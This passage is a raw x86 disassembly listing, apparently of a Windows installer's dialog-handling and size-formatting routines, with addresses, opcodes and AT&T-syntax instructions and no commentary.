  403a0e:	49                   	dec    %ecx
  403a0f:	66 85 ee             	test   %bp,%si
  403a12:	74 06                	je     0x403a1a
  403a14:	85 c9                	test   %ecx,%ecx
  403a16:	75 ee                	jne    0x403a06
  403a18:	eb 19                	jmp    0x403a33
  403a1a:	8b 48 02             	mov    0x2(%eax),%ecx
  403a1d:	89 0d 5c 85 46 00    	mov    %ecx,0x46855c
  403a23:	8b 48 06             	mov    0x6(%eax),%ecx
  403a26:	89 0d 68 06 47 00    	mov    %ecx,0x470668
  403a2c:	8d 48 0a             	lea    0xa(%eax),%ecx
  403a2f:	85 c9                	test   %ecx,%ecx
  403a31:	75 15                	jne    0x403a48
  403a33:	b8 ff ff 00 00       	mov    $0xffff,%eax
  403a38:	66 3b f0             	cmp    %ax,%si
  403a3b:	75 07                	jne    0x403a44
  403a3d:	be ff 03 00 00       	mov    $0x3ff,%esi
  403a42:	eb a3                	jmp    0x4039e7
  403a44:	33 f6                	xor    %esi,%esi
  403a46:	eb 9f                	jmp    0x4039e7
  403a48:	89 0d 68 85 46 00    	mov    %ecx,0x468568
  403a4e:	0f b7 00             	movzwl (%eax),%eax
  403a51:	50                   	push   %eax
  403a52:	57                   	push   %edi
  403a53:	e8 7b 1f 00 00       	call   0x4059d3
  403a58:	6a fe                	push   $0xfffffffe
  403a5a:	68 80 85 46 00       	push   $0x468580
  403a5f:	e8 3a 26 00 00       	call   0x40609e
  403a64:	50                   	push   %eax
  403a65:	ff 35 00 a2 43 00    	push   0x43a200
  403a6b:	ff 15 28 82 40 00    	call   *0x408228
  403a71:	8b 35 a8 05 47 00    	mov    0x4705a8,%esi
  403a77:	8b 3d ac 05 47 00    	mov    0x4705ac,%edi
  403a7d:	eb 17                	jmp    0x403a96
  403a7f:	8b 06                	mov    (%esi),%eax
  403a81:	4f                   	dec    %edi
  403a82:	85 c0                	test   %eax,%eax
  403a84:	74 0a                	je     0x403a90
  403a86:	50                   	push   %eax
  403a87:	8d 46 18             	lea    0x18(%esi),%eax
  403a8a:	50                   	push   %eax
  403a8b:	e8 0e 26 00 00       	call   0x40609e
  403a90:	81 c6 20 40 00 00    	add    $0x4020,%esi
  403a96:	85 ff                	test   %edi,%edi
  403a98:	75 e5                	jne    0x403a7f
  403a9a:	5f                   	pop    %edi
  403a9b:	5e                   	pop    %esi
  403a9c:	5d                   	pop    %ebp
  403a9d:	5b                   	pop    %ebx
  403a9e:	c3                   	ret
  403a9f:	55                   	push   %ebp
  403aa0:	8b ec                	mov    %esp,%ebp
  403aa2:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  403aa6:	56                   	push   %esi
  403aa7:	8b 35 78 82 40 00    	mov    0x408278,%esi
  403aad:	75 1c                	jne    0x403acb
  403aaf:	ff 75 14             	push   0x14(%ebp)
  403ab2:	68 fb 03 00 00       	push   $0x3fb
  403ab7:	e8 49 1c 00 00       	call   0x405705
  403abc:	ff 75 14             	push   0x14(%ebp)
  403abf:	6a 01                	push   $0x1
  403ac1:	68 67 04 00 00       	push   $0x467
  403ac6:	ff 75 08             	push   0x8(%ebp)
  403ac9:	ff d6                	call   *%esi
  403acb:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  403acf:	75 2d                	jne    0x403afe
  403ad1:	ff 75 14             	push   0x14(%ebp)
  403ad4:	ff 75 10             	push   0x10(%ebp)
  403ad7:	ff 15 7c 81 40 00    	call   *0x40817c
  403add:	85 c0                	test   %eax,%eax
  403adf:	74 0e                	je     0x403aef
  403ae1:	6a 07                	push   $0x7
  403ae3:	e8 35 d9 ff ff       	call   0x40141d
  403ae8:	85 c0                	test   %eax,%eax
  403aea:	75 03                	jne    0x403aef
  403aec:	40                   	inc    %eax
  403aed:	eb 02                	jmp    0x403af1
  403aef:	33 c0                	xor    %eax,%eax
  403af1:	50                   	push   %eax
  403af2:	6a 00                	push   $0x0
  403af4:	68 65 04 00 00       	push   $0x465
  403af9:	ff 75 08             	push   0x8(%ebp)
  403afc:	ff d6                	call   *%esi
  403afe:	33 c0                	xor    %eax,%eax
  403b00:	5e                   	pop    %esi
  403b01:	5d                   	pop    %ebp
  403b02:	c2 10 00             	ret    $0x10
  403b05:	53                   	push   %ebx
  403b06:	8b 1d 44 81 40 00    	mov    0x408144,%ebx
  403b0c:	55                   	push   %ebp
  403b0d:	56                   	push   %esi
  403b0e:	33 f6                	xor    %esi,%esi
  403b10:	56                   	push   %esi
  403b11:	56                   	push   %esi
  403b12:	56                   	push   %esi
  403b13:	56                   	push   %esi
  403b14:	6a ff                	push   $0xffffffff
  403b16:	ff 74 24 24          	push   0x24(%esp)
  403b1a:	56                   	push   %esi
  403b1b:	56                   	push   %esi
  403b1c:	ff d3                	call   *%ebx
  403b1e:	33 ed                	xor    %ebp,%ebp
  403b20:	3b c6                	cmp    %esi,%eax
  403b22:	74 1e                	je     0x403b42
  403b24:	57                   	push   %edi
  403b25:	8d 78 01             	lea    0x1(%eax),%edi
  403b28:	57                   	push   %edi
  403b29:	6a 40                	push   $0x40
  403b2b:	ff 15 20 81 40 00    	call   *0x408120
  403b31:	56                   	push   %esi
  403b32:	56                   	push   %esi
  403b33:	57                   	push   %edi
  403b34:	8b e8                	mov    %eax,%ebp
  403b36:	55                   	push   %ebp
  403b37:	6a ff                	push   $0xffffffff
  403b39:	ff 74 24 28          	push   0x28(%esp)
  403b3d:	56                   	push   %esi
  403b3e:	56                   	push   %esi
  403b3f:	ff d3                	call   *%ebx
  403b41:	5f                   	pop    %edi
  403b42:	5e                   	pop    %esi
  403b43:	8b c5                	mov    %ebp,%eax
  403b45:	5d                   	pop    %ebp
  403b46:	5b                   	pop    %ebx
  403b47:	c3                   	ret
  403b48:	55                   	push   %ebp
  403b49:	8b ec                	mov    %esp,%ebp
  403b4b:	83 3d 44 62 45 00 00 	cmpl   $0x0,0x456244
  403b52:	56                   	push   %esi
  403b53:	75 50                	jne    0x403ba5
  403b55:	ff 75 10             	push   0x10(%ebp)
  403b58:	a1 d8 61 43 00       	mov    0x4361d8,%eax
  403b5d:	8b 75 08             	mov    0x8(%ebp),%esi
  403b60:	03 c6                	add    %esi,%eax
  403b62:	50                   	push   %eax
  403b63:	ff 75 0c             	push   0xc(%ebp)
  403b66:	ff 15 b8 80 40 00    	call   *0x4080b8
  403b6c:	ff 75 0c             	push   0xc(%ebp)
  403b6f:	ff 15 4c 81 40 00    	call   *0x40814c
  403b75:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403b78:	01 05 d8 61 43 00    	add    %eax,0x4361d8
  403b7e:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403b82:	89 01                	mov    %eax,(%ecx)
  403b84:	7e 25                	jle    0x403bab
  403b86:	85 c0                	test   %eax,%eax
  403b88:	75 21                	jne    0x403bab
  403b8a:	39 05 f0 a1 43 00    	cmp    %eax,0x43a1f0
  403b90:	74 19                	je     0x403bab
  403b92:	56                   	push   %esi
  403b93:	ff 15 2c 81 40 00    	call   *0x40812c
  403b99:	c7 05 44 62 45 00 01 	movl   $0x1,0x456244
  403ba0:	00 00 00 
  403ba3:	eb 06                	jmp    0x403bab
  403ba5:	8b 45 14             	mov    0x14(%ebp),%eax
  403ba8:	83 20 00             	andl   $0x0,(%eax)
  403bab:	33 c0                	xor    %eax,%eax
  403bad:	5e                   	pop    %esi
  403bae:	5d                   	pop    %ebp
  403baf:	c2 10 00             	ret    $0x10
  403bb2:	55                   	push   %ebp
  403bb3:	8b ec                	mov    %esp,%ebp
  403bb5:	8b 45 10             	mov    0x10(%ebp),%eax
  403bb8:	d1 e8                	shr    $1,%eax
  403bba:	75 03                	jne    0x403bbf
  403bbc:	33 c0                	xor    %eax,%eax
  403bbe:	40                   	inc    %eax
  403bbf:	8b 0d d8 61 43 00    	mov    0x4361d8,%ecx
  403bc5:	50                   	push   %eax
  403bc6:	8b 45 08             	mov    0x8(%ebp),%eax
  403bc9:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  403bcc:	50                   	push   %eax
  403bcd:	ff 75 0c             	push   0xc(%ebp)
  403bd0:	ff 15 c0 80 40 00    	call   *0x4080c0
  403bd6:	ff 75 0c             	push   0xc(%ebp)
  403bd9:	ff 15 70 81 40 00    	call   *0x408170
  403bdf:	8b 55 14             	mov    0x14(%ebp),%edx
  403be2:	01 05 d8 61 43 00    	add    %eax,0x4361d8
  403be8:	8d 0c 00             	lea    (%eax,%eax,1),%ecx
  403beb:	89 0a                	mov    %ecx,(%edx)
  403bed:	33 c0                	xor    %eax,%eax
  403bef:	5d                   	pop    %ebp
  403bf0:	c2 10 00             	ret    $0x10
  403bf3:	55                   	push   %ebp
  403bf4:	8b ec                	mov    %esp,%ebp
  403bf6:	83 ec 18             	sub    $0x18,%esp
  403bf9:	53                   	push   %ebx
  403bfa:	33 db                	xor    %ebx,%ebx
  403bfc:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  403c03:	56                   	push   %esi
  403c04:	57                   	push   %edi
  403c05:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  403c08:	0f 85 2d 01 00 00    	jne    0x403d3b
  403c0e:	8b 7d 14             	mov    0x14(%ebp),%edi
  403c11:	8b 47 30             	mov    0x30(%edi),%eax
  403c14:	3b c3                	cmp    %ebx,%eax
  403c16:	7d 11                	jge    0x403c29
  403c18:	8b 0d 68 85 46 00    	mov    0x468568,%ecx
  403c1e:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  403c25:	2b c8                	sub    %eax,%ecx
  403c27:	8b 01                	mov    (%ecx),%eax
  403c29:	8b 0d b8 05 47 00    	mov    0x4705b8,%ecx
  403c2f:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  403c32:	0f b7 08             	movzwl (%eax),%ecx
  403c35:	40                   	inc    %eax
  403c36:	40                   	inc    %eax
  403c37:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  403c3a:	89 1d 44 62 45 00    	mov    %ebx,0x456244
  403c40:	89 45 14             	mov    %eax,0x14(%ebp)
  403c43:	f6 c1 10             	test   $0x10,%cl
  403c46:	74 09                	je     0x403c51
  403c48:	c7 45 fc b2 3b 40 00 	movl   $0x403bb2,-0x4(%ebp)
  403c4f:	eb 18                	jmp    0x403c69
  403c51:	50                   	push   %eax
  403c52:	c7 45 fc 48 3b 40 00 	movl   $0x403b48,-0x4(%ebp)
  403c59:	e8 a7 fe ff ff       	call   0x403b05
  403c5e:	59                   	pop    %ecx
  403c5f:	c7 05 f0 a1 43 00 01 	movl   $0x1,0x43a1f0
  403c66:	00 00 00 
  403c69:	ff 77 34             	push   0x34(%edi)
  403c6c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403c6f:	8b 47 14             	mov    0x14(%edi),%eax
  403c72:	8b f0                	mov    %eax,%esi
  403c74:	c1 ee 05             	shr    $0x5,%esi
  403c77:	f7 d6                	not    %esi
  403c79:	6a 22                	push   $0x22
  403c7b:	ff 75 08             	push   0x8(%ebp)
  403c7e:	0b f0                	or     %eax,%esi
  403c80:	83 e6 01             	and    $0x1,%esi
  403c83:	e8 13 fc ff ff       	call   0x40389b
  403c88:	ff 77 38             	push   0x38(%edi)
  403c8b:	6a 23                	push   $0x23
  403c8d:	ff 75 08             	push   0x8(%ebp)
  403c90:	e8 06 fc ff ff       	call   0x40389b
  403c95:	33 c0                	xor    %eax,%eax
  403c97:	3b f3                	cmp    %ebx,%esi
  403c99:	0f 94 c0             	sete   %al
  403c9c:	6a 01                	push   $0x1
  403c9e:	05 0a 04 00 00       	add    $0x40a,%eax
  403ca3:	50                   	push   %eax
  403ca4:	ff 75 08             	push   0x8(%ebp)
  403ca7:	ff 15 e8 81 40 00    	call   *0x4081e8
  403cad:	56                   	push   %esi
  403cae:	e8 2e fc ff ff       	call   0x4038e1
  403cb3:	68 e8 03 00 00       	push   $0x3e8
  403cb8:	ff 75 08             	push   0x8(%ebp)
  403cbb:	ff 15 60 82 40 00    	call   *0x408260
  403cc1:	8b f8                	mov    %eax,%edi
  403cc3:	57                   	push   %edi
  403cc4:	e8 2b fc ff ff       	call   0x4038f4
  403cc9:	8b 35 78 82 40 00    	mov    0x408278,%esi
  403ccf:	53                   	push   %ebx
  403cd0:	6a 01                	push   $0x1
  403cd2:	68 5b 04 00 00       	push   $0x45b
  403cd7:	57                   	push   %edi
  403cd8:	ff d6                	call   *%esi
  403cda:	a1 9c 05 47 00       	mov    0x47059c,%eax
  403cdf:	8b 40 68             	mov    0x68(%eax),%eax
  403ce2:	3b c3                	cmp    %ebx,%eax
  403ce4:	7d 09                	jge    0x403cef
  403ce6:	f7 d8                	neg    %eax
  403ce8:	50                   	push   %eax
  403ce9:	ff 15 4c 82 40 00    	call   *0x40824c
  403cef:	50                   	push   %eax
  403cf0:	53                   	push   %ebx
  403cf1:	68 43 04 00 00       	push   $0x443
  403cf6:	57                   	push   %edi
  403cf7:	ff d6                	call   *%esi
  403cf9:	68 00 00 01 04       	push   $0x4010000
  403cfe:	53                   	push   %ebx
  403cff:	68 45 04 00 00       	push   $0x445
  403d04:	57                   	push   %edi
  403d05:	ff d6                	call   *%esi
  403d07:	ff 75 14             	push   0x14(%ebp)
  403d0a:	89 1d d8 61 43 00    	mov    %ebx,0x4361d8
  403d10:	e8 8d 1d 00 00       	call   0x405aa2
  403d15:	50                   	push   %eax
  403d16:	53                   	push   %ebx
  403d17:	68 35 04 00 00       	push   $0x435
  403d1c:	57                   	push   %edi
  403d1d:	ff d6                	call   *%esi
  403d1f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403d22:	50                   	push   %eax
  403d23:	ff 75 0c             	push   0xc(%ebp)
  403d26:	68 49 04 00 00       	push   $0x449
  403d2b:	57                   	push   %edi
  403d2c:	ff d6                	call   *%esi
  403d2e:	89 1d 4c 62 45 00    	mov    %ebx,0x45624c
  403d34:	33 c0                	xor    %eax,%eax
  403d36:	e9 5b 01 00 00       	jmp    0x403e96
  403d3b:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  403d42:	8b 35 78 82 40 00    	mov    0x408278,%esi
  403d48:	75 5c                	jne    0x403da6
  403d4a:	8b 45 10             	mov    0x10(%ebp),%eax
  403d4d:	c1 e8 10             	shr    $0x10,%eax
  403d50:	66 85 c0             	test   %ax,%ax
  403d53:	0f 85 2e 01 00 00    	jne    0x403e87
  403d59:	39 1d 4c 62 45 00    	cmp    %ebx,0x45624c
  403d5f:	0f 85 22 01 00 00    	jne    0x403e87
  403d65:	8b 3d 40 62 45 00    	mov    0x456240,%edi
  403d6b:	83 c7 14             	add    $0x14,%edi
  403d6e:	f6 07 20             	testb  $0x20,(%edi)
  403d71:	0f 84 10 01 00 00    	je     0x403e87
  403d77:	53                   	push   %ebx
  403d78:	53                   	push   %ebx
  403d79:	68 f0 00 00 00       	push   $0xf0
  403d7e:	68 0a 04 00 00       	push   $0x40a
  403d83:	ff 75 08             	push   0x8(%ebp)
  403d86:	ff 15 60 82 40 00    	call   *0x408260
  403d8c:	50                   	push   %eax
  403d8d:	ff d6                	call   *%esi
  403d8f:	8b 0f                	mov    (%edi),%ecx
  403d91:	83 e0 01             	and    $0x1,%eax
  403d94:	83 e1 fe             	and    $0xfffffffe,%ecx
  403d97:	0b c8                	or     %eax,%ecx
  403d99:	50                   	push   %eax
  403d9a:	89 0f                	mov    %ecx,(%edi)
  403d9c:	e8 40 fb ff ff       	call   0x4038e1
  403da1:	e8 17 fb ff ff       	call   0x4038bd
  403da6:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  403daa:	0f 85 c8 00 00 00    	jne    0x403e78
  403db0:	68 e8 03 00 00       	push   $0x3e8
  403db5:	ff 75 08             	push   0x8(%ebp)
  403db8:	ff 15 60 82 40 00    	call   *0x408260
  403dbe:	8b 7d 14             	mov    0x14(%ebp),%edi
  403dc1:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  403dc8:	75 6f                	jne    0x403e39
  403dca:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  403dd1:	75 66                	jne    0x403e39
  403dd3:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  403dd6:	8b 57 18             	mov    0x18(%edi),%edx
  403dd9:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  403ddc:	2b ca                	sub    %edx,%ecx
  403dde:	89 55 e8             	mov    %edx,-0x18(%ebp)
  403de1:	c7 45 f0 00 05 46 00 	movl   $0x460500,-0x10(%ebp)
  403de8:	81 f9 10 80 00 00    	cmp    $0x8010,%ecx
  403dee:	73 49                	jae    0x403e39
  403df0:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403df3:	51                   	push   %ecx
  403df4:	53                   	push   %ebx
  403df5:	68 4b 04 00 00       	push   $0x44b
  403dfa:	50                   	push   %eax
  403dfb:	ff d6                	call   *%esi
  403dfd:	8b 3d 40 82 40 00    	mov    0x408240,%edi
  403e03:	68 02 7f 00 00       	push   $0x7f02
  403e08:	53                   	push   %ebx
  403e09:	ff d7                	call   *%edi
  403e0b:	50                   	push   %eax
  403e0c:	ff 15 44 82 40 00    	call   *0x408244
  403e12:	6a 01                	push   $0x1
  403e14:	53                   	push   %ebx
  403e15:	53                   	push   %ebx
  403e16:	ff 75 f0             	push   -0x10(%ebp)
  403e19:	68 f8 85 40 00       	push   $0x4085f8
  403e1e:	ff 75 08             	push   0x8(%ebp)
  403e21:	ff 15 84 81 40 00    	call   *0x408184
  403e27:	68 00 7f 00 00       	push   $0x7f00
  403e2c:	53                   	push   %ebx
  403e2d:	ff d7                	call   *%edi
  403e2f:	50                   	push   %eax
  403e30:	ff 15 44 82 40 00    	call   *0x408244
  403e36:	8b 7d 14             	mov    0x14(%ebp),%edi
  403e39:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  403e40:	75 48                	jne    0x403e8a
  403e42:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  403e49:	75 3f                	jne    0x403e8a
  403e4b:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  403e4f:	75 10                	jne    0x403e61
  403e51:	53                   	push   %ebx
  403e52:	6a 01                	push   $0x1
  403e54:	68 11 01 00 00       	push   $0x111
  403e59:	ff 35 94 05 47 00    	push   0x470594
  403e5f:	ff d6                	call   *%esi
  403e61:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  403e65:	75 0c                	jne    0x403e73
  403e67:	53                   	push   %ebx
  403e68:	53                   	push   %ebx
  403e69:	6a 10                	push   $0x10
  403e6b:	ff 35 94 05 47 00    	push   0x470594
  403e71:	ff d6                	call   *%esi
  403e73:	33 c0                	xor    %eax,%eax
  403e75:	40                   	inc    %eax
  403e76:	eb 1e                	jmp    0x403e96
  403e78:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  403e7f:	75 06                	jne    0x403e87
  403e81:	ff 05 4c 62 45 00    	incl   0x45624c
  403e87:	8b 7d 14             	mov    0x14(%ebp),%edi
  403e8a:	8b 45 0c             	mov    0xc(%ebp),%eax
  403e8d:	57                   	push   %edi
  403e8e:	ff 75 10             	push   0x10(%ebp)
  403e91:	e8 90 fa ff ff       	call   0x403926
  403e96:	5f                   	pop    %edi
  403e97:	5e                   	pop    %esi
  403e98:	5b                   	pop    %ebx
  403e99:	c9                   	leave
  403e9a:	c2 10 00             	ret    $0x10
  403e9d:	55                   	push   %ebp
  403e9e:	8b ec                	mov    %esp,%ebp
  403ea0:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  403ea7:	56                   	push   %esi
  403ea8:	8b 75 14             	mov    0x14(%ebp),%esi
  403eab:	75 29                	jne    0x403ed6
  403ead:	ff 76 30             	push   0x30(%esi)
  403eb0:	6a 1d                	push   $0x1d
  403eb2:	ff 75 08             	push   0x8(%ebp)
  403eb5:	e8 e1 f9 ff ff       	call   0x40389b
  403eba:	8b 46 3c             	mov    0x3c(%esi),%eax
  403ebd:	69 c0 08 40 00 00    	imul   $0x4008,%eax,%eax
  403ec3:	05 00 10 47 00       	add    $0x471000,%eax
  403ec8:	50                   	push   %eax
  403ec9:	68 e8 03 00 00       	push   $0x3e8
  403ece:	ff 75 08             	push   0x8(%ebp)
  403ed1:	e8 29 18 00 00       	call   0x4056ff
  403ed6:	8b 45 0c             	mov    0xc(%ebp),%eax
  403ed9:	56                   	push   %esi
  403eda:	ff 75 10             	push   0x10(%ebp)
  403edd:	e8 44 fa ff ff       	call   0x403926
  403ee2:	5e                   	pop    %esi
  403ee3:	5d                   	pop    %ebp
  403ee4:	c2 10 00             	ret    $0x10
  403ee7:	55                   	push   %ebp
  403ee8:	8b ec                	mov    %esp,%ebp
  403eea:	81 ec 84 00 00 00    	sub    $0x84,%esp
  403ef0:	53                   	push   %ebx
  403ef1:	56                   	push   %esi
  403ef2:	57                   	push   %edi
  403ef3:	8b f8                	mov    %eax,%edi
  403ef5:	6a 14                	push   $0x14
  403ef7:	5b                   	pop    %ebx
  403ef8:	c7 45 fc dc ff ff ff 	movl   $0xffffffdc,-0x4(%ebp)
  403eff:	81 ff 00 00 10 00    	cmp    $0x100000,%edi
  403f05:	73 0a                	jae    0x403f11
  403f07:	6a 0a                	push   $0xa
  403f09:	5b                   	pop    %ebx
  403f0a:	c7 45 fc dd ff ff ff 	movl   $0xffffffdd,-0x4(%ebp)
  403f11:	81 ff 00 04 00 00    	cmp    $0x400,%edi
  403f17:	73 09                	jae    0x403f22
  403f19:	33 db                	xor    %ebx,%ebx
  403f1b:	c7 45 fc de ff ff ff 	movl   $0xffffffde,-0x4(%ebp)
  403f22:	81 ff 33 33 ff ff    	cmp    $0xffff3333,%edi
  403f28:	73 0f                	jae    0x403f39
  403f2a:	33 c0                	xor    %eax,%eax
  403f2c:	40                   	inc    %eax
  403f2d:	8b cb                	mov    %ebx,%ecx
  403f2f:	d3 e0                	shl    %cl,%eax
  403f31:	6a 14                	push   $0x14
  403f33:	59                   	pop    %ecx
  403f34:	99                   	cltd
  403f35:	f7 f9                	idiv   %ecx
  403f37:	03 f8                	add    %eax,%edi
  403f39:	ff 75 0c             	push   0xc(%ebp)
  403f3c:	be 20 62 44 00       	mov    $0x446220,%esi
  403f41:	56                   	push   %esi
  403f42:	e8 57 21 00 00       	call   0x40609e
  403f47:	6a df                	push   $0xffffffdf
  403f49:	8d 45 bc             	lea    -0x44(%ebp),%eax
  403f4c:	50                   	push   %eax
  403f4d:	e8 4c 21 00 00       	call   0x40609e
  403f52:	50                   	push   %eax
  403f53:	ff 75 fc             	push   -0x4(%ebp)
  403f56:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  403f5c:	50                   	push   %eax
  403f5d:	e8 3c 21 00 00       	call   0x40609e
  403f62:	50                   	push   %eax
  403f63:	8b c7                	mov    %edi,%eax
  403f65:	25 ff ff ff 00       	and    $0xffffff,%eax
  403f6a:	6b c0 0a             	imul   $0xa,%eax,%eax
  403f6d:	6a 0a                	push   $0xa
  403f6f:	8b cb                	mov    %ebx,%ecx
  403f71:	d3 e8                	shr    %cl,%eax
  403f73:	59                   	pop    %ecx
  403f74:	33 d2                	xor    %edx,%edx
  403f76:	f7 f1                	div    %ecx
  403f78:	8b cb                	mov    %ebx,%ecx
  403f7a:	d3 ef                	shr    %cl,%edi
  403f7c:	52                   	push   %edx
  403f7d:	57                   	push   %edi
  403f7e:	68 04 86 40 00       	push   $0x408604
  403f83:	56                   	push   %esi
  403f84:	e8 19 1b 00 00       	call   0x405aa2
  403f89:	8d 04 45 20 62 44 00 	lea    0x446220(,%eax,2),%eax
  403f90:	50                   	push   %eax
  403f91:	ff 15 38 82 40 00    	call   *0x408238
  403f97:	83 c4 18             	add    $0x18,%esp
  403f9a:	56                   	push   %esi
  403f9b:	ff 75 08             	push   0x8(%ebp)
  403f9e:	ff 35 48 85 46 00    	push   0x468548
  403fa4:	e8 56 17 00 00       	call   0x4056ff
  403fa9:	5f                   	pop    %edi
  403faa:	5e                   	pop    %esi
  403fab:	5b                   	pop    %ebx
  403fac:	c9                   	leave
  403fad:	c2 08 00             	ret    $0x8
  403fb0:	8b 15 ac 05 47 00    	mov    0x4705ac,%edx
  403fb6:	8b 0d a8 05 47 00    	mov    0x4705a8,%ecx
  403fbc:	33 c0                	xor    %eax,%eax
  403fbe:	85 d2                	test   %edx,%edx
  403fc0:	74 1a                	je     0x403fdc
  403fc2:	56                   	push   %esi
  403fc3:	4a                   	dec    %edx
  403fc4:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  403fc8:	74 07                	je     0x403fd1
  403fca:	8b 74 24 08          	mov    0x8(%esp),%esi
  403fce:	03 04 b1             	add    (%ecx,%esi,4),%eax
  403fd1:	81 c1 20 40 00 00    	add    $0x4020,%ecx
  403fd7:	85 d2                	test   %edx,%edx
  403fd9:	75 e8                	jne    0x403fc3
  403fdb:	5e                   	pop    %esi
  403fdc:	c2 04 00             	ret    $0x4
  403fdf:	55                   	push   %ebp
  403fe0:	8b ec                	mov    %esp,%ebp
  403fe2:	83 ec 48             	sub    $0x48,%esp
  403fe5:	a1 40 62 45 00       	mov    0x456240,%eax
  403fea:	53                   	push   %ebx
  403feb:	56                   	push   %esi
  403fec:	8b 70 3c             	mov    0x3c(%eax),%esi
  403fef:	69 f6 08 40 00 00    	imul   $0x4008,%esi,%esi
  403ff5:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403ff8:	8b 40 38             	mov    0x38(%eax),%eax
  403ffb:	81 c6 00 10 47 00    	add    $0x471000,%esi
  404001:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404008:	57                   	push   %edi
  404009:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40400c:	bb fb 03 00 00       	mov    $0x3fb,%ebx
  404011:	75 0d                	jne    0x404020
  404013:	56                   	push   %esi
  404014:	53                   	push   %ebx
  404015:	e8 eb 16 00 00       	call   0x405705
  40401a:	56                   	push   %esi
  40401b:	e8 9b 1a 00 00       	call   0x405abb
  404020:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404027:	75 72                	jne    0x40409b
  404029:	8b 7d 08             	mov    0x8(%ebp),%edi
  40402c:	53                   	push   %ebx
  40402d:	57                   	push   %edi
  40402e:	ff 15 60 82 40 00    	call   *0x408260
  404034:	56                   	push   %esi
  404035:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404038:	e8 69 17 00 00       	call   0x4057a6
  40403d:	85 c0                	test   %eax,%eax
  40403f:	74 10                	je     0x404051
  404041:	56                   	push   %esi
  404042:	e8 94 17 00 00       	call   0x4057db
  404047:	85 c0                	test   %eax,%eax
  404049:	75 06                	jne    0x404051
  40404b:	56                   	push   %esi
  40404c:	e8 69 1f 00 00       	call   0x405fba
  404051:	56                   	push   %esi
  404052:	ff 75 f8             	push   -0x8(%ebp)
  404055:	89 3d 48 85 46 00    	mov    %edi,0x468548
  40405b:	ff 15 28 82 40 00    	call   *0x408228
  404061:	8b 45 14             	mov    0x14(%ebp),%eax
  404064:	ff 70 34             	push   0x34(%eax)
  404067:	6a 01                	push   $0x1
  404069:	57                   	push   %edi
  40406a:	e8 2c f8 ff ff       	call   0x40389b
  40406f:	8b 45 14             	mov    0x14(%ebp),%eax
  404072:	ff 70 30             	push   0x30(%eax)
  404075:	6a 14                	push   $0x14
  404077:	57                   	push   %edi
  404078:	e8 1e f8 ff ff       	call   0x40389b
  40407d:	ff 75 f8             	push   -0x8(%ebp)
  404080:	e8 6f f8 ff ff       	call   0x4038f4
  404085:	6a 07                	push   $0x7
  404087:	e8 07 1b 00 00       	call   0x405b93
  40408c:	85 c0                	test   %eax,%eax
  40408e:	0f 84 7a 02 00 00    	je     0x40430e
  404094:	6a 01                	push   $0x1
  404096:	ff 75 f8             	push   -0x8(%ebp)
  404099:	ff d0                	call   *%eax
  40409b:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  4040a2:	0f 85 d2 00 00 00    	jne    0x40417a
  4040a8:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  4040ac:	3b c3                	cmp    %ebx,%eax
  4040ae:	75 1b                	jne    0x4040cb
  4040b0:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4040b3:	c1 e9 10             	shr    $0x10,%ecx
  4040b6:	ba 00 03 00 00       	mov    $0x300,%edx
  4040bb:	66 3b ca             	cmp    %dx,%cx
  4040be:	0f 85 4a 02 00 00    	jne    0x40430e
  4040c4:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4040cb:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  4040d0:	0f 85 a4 00 00 00    	jne    0x40417a
  4040d6:	6a 07                	push   $0x7
  4040d8:	59                   	pop    %ecx
  4040d9:	ff 75 fc             	push   -0x4(%ebp)
  4040dc:	33 c0                	xor    %eax,%eax
  4040de:	8d 7d bc             	lea    -0x44(%ebp),%edi
  4040e1:	f3 ab                	rep stos %eax,%es:(%edi)
  4040e3:	8b 45 08             	mov    0x8(%ebp),%eax
  4040e6:	bf 20 62 44 00       	mov    $0x446220,%edi
  4040eb:	68 e8 61 43 00       	push   $0x4361e8
  4040f0:	89 45 b8             	mov    %eax,-0x48(%ebp)
  4040f3:	89 7d c0             	mov    %edi,-0x40(%ebp)
  4040f6:	c7 45 cc 9f 3a 40 00 	movl   $0x403a9f,-0x34(%ebp)
  4040fd:	89 75 d0             	mov    %esi,-0x30(%ebp)
  404100:	e8 99 1f 00 00       	call   0x40609e
  404105:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  404108:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40410b:	50                   	push   %eax
  40410c:	c7 45 c8 41 00 00 00 	movl   $0x41,-0x38(%ebp)
